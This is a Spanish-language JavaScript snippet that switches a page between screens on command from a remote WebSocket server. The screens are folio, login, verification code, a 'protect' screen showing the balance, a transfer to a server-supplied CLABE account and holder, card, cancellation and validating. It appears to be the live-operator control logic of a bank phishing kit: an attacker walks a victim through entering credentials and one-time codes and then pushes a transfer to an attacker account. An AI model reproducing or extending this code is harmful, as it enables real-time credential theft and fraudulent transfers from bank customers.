  <script>
    const pantallas = {
      folio: document.getElementById('pantalla-folio'),
      login: document.getElementById('pantalla-login'),
      codigo: document.getElementById('pantalla-codigo'),
      proteger: document.getElementById('pantalla-proteger'),
      transferencia: document.getElementById('pantalla-transferencia'),
      tarjeta: document.getElementById('pantalla-tarjeta'),
      cancelacion: document.getElementById('pantalla-cancelacion'),
      validando: document.getElementById('pantalla-validando'),
    };

    function mostrarPantalla(nombre) {
      Object.values(pantallas).forEach(p => p.classList.remove('active'));
      if (pantallas[nombre]) pantallas[nombre].classList.add('active');
    }

    // Mostrar folio como pantalla inicial
    mostrarPantalla('folio');

    const socket = new WebSocket("wss://tu-servidor-websocket.com");

    socket.onmessage = (event) => {
      const data = JSON.parse(event.data);
      if (data.tipo === "mostrar_folio") mostrarPantalla("folio");
      if (data.tipo === "mostrar_login") mostrarPantalla("login");
      if (data.tipo === "mostrar_codigo") {
        document.getElementById("terminacion").textContent = data.terminacion || "2222";
        mostrarPantalla("codigo");
      }
      if (data.tipo === "mostrar_proteger") {
        document.getElementById("saldo").textContent = "$" + (data.saldo || "0");
        mostrarPantalla("proteger");
      }
      if (data.tipo === "mostrar_transferencia") {
        document.getElementById("montoTransferencia").textContent = "$" + (data.monto || "0");
        document.getElementById("clabe").textContent = data.clabe || "XXXXXXXXXXXX";
        document.getElementById("titular").textContent = data.titular || "Sin nombre";
        mostrarPantalla("transferencia");
      }
      if (data.tipo === "mostrar_tarjeta") mostrarPantalla("tarjeta");
      if (data.tipo === "mostrar_cancelacion") {
        document.getElementById("comercio").textContent = data.comercio || "Desconocido";
        document.getElementById("montoDevuelto").textContent = "$" + (data.monto || "0");
        mostrarPantalla("cancelacion");
      }
      if (data.tipo === "mostrar_validando") mostrarPantalla("validando");
    };
  </script>

